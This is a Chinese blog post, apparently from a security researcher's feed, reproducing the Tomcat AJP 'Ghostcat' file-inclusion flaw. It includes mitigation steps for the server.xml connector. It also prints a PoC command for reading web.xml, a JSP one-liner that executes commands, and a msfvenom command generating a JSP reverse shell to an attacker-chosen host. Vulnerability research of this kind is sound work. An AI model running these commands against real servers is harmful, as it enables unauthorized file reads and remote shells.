    <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>&emsp;&emsp; Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p><hr><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><ul><li>Apache Tomcat 6 </li><li>Apache Tomcat 7 &lt; 7.0.100 </li><li>Apache Tomcat 8 &lt; 8.5.51 </li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><hr><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>&emsp;&emsp; 之前代码审计的时候安装了apache tomcat/9.0.29还存在这个漏洞，所以索性复现一下漏洞。这里环境搭建很简单，去官方网站下载tomcat下载安装就好了，不会随便百度一篇文章看看，笔者这里就不多说什么了。</p><p><img src="https://img-blog.csdnimg.cn/20200221193023649.png" alt="在这里插入图片描述"></p><hr><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><code>python poc.py -p 8009 -f &quot;/WEB-INF/web.xml&quot; 127.0.0.1</code><img src="https://img-blog.csdnimg.cn/20200221193441663.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221193330182.jpg" alt="在这里插入图片描述"></p><hr><h1 id="骚操作-RCE"><a href="#骚操作-RCE" class="headerlink" title="骚操作 RCE"></a>骚操作 RCE</h1><p>&emsp;&emsp; 利用大佬hero0修改poc脚本，修改成了python3版本。<br>增加了 –rce选项，会使用jsp渲染执行文本中包含的命令，默认读取文件模式。<br>可以配合上传漏洞进行漏洞利用。<br>命令执行一句话:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200221200551291.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221195146769.png" alt="在这里插入图片描述"><br><strong>利用msf反弹shell</strong>（也是需要配合上传漏洞）<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 &gt; shell.txt</code><br><img src="https://img-blog.csdnimg.cn/20200221202102945.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221195022259.png" alt="在这里插入图片描述"></p><hr><h1 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h1><p>如果相关用户暂时无法进行版本升级，可根据自身情况采用下列防护措施。</p><p>一、若不需要使用Tomcat AJP协议，可直接关闭AJP Connector，或将其监听地址改为仅监听本机localhost。</p><p>具体操作：</p><p>（1）编辑 <CATALINA_BASE>/conf/server.xml，找到如下行（<CATALINA_BASE> 为 Tomcat 的工作目录）：</CATALINA_BASE></CATALINA_BASE></p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;</code><br>（2）将此行注释掉（也可删掉该行）：</p><p><code>&lt;!--&lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;--&gt;</code></p><p>（3）保存后需重新启动Tomcat，规则方可生效。</p><p>二、若需使用Tomcat AJP协议，可根据使用版本配置协议属性设置认证凭证。</p><p>使用Tomcat 7和Tomcat 9的用户可为AJP Connector配置secret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt;</code></p><p>使用Tomcat 8的用户可为AJP Connector配置requiredSecret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;requiredSecret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt;</code></p><hr><h1 id="文件资料下载"><a href="#文件资料下载" class="headerlink" title="文件资料下载"></a>文件资料下载</h1><p>文中所以资料都在这里。<br>链接: <a href="https://pan.baidu.com/s/101wFmK1J0OGYRC383fdBBA" target="_blank" rel="noopener">https://pan.baidu.com/s/101wFmK1J0OGYRC383fdBBA</a> 提取码: xg4s</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.t00ls.net/thread-55061-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-55061-1-1.html</a><br><a href="https://www.t00ls.net/viewthread.php?tid=55062&amp;extra=&amp;page=1" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=55062&amp;extra=&amp;page=1</a><br><a href="https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC" target="_blank" rel="noopener">https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC</a>**</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统
      
    
    </summary>
    
    
      <category term="总结" scheme="https://summersec.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="漏洞复现" scheme="https://summersec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
</feed>
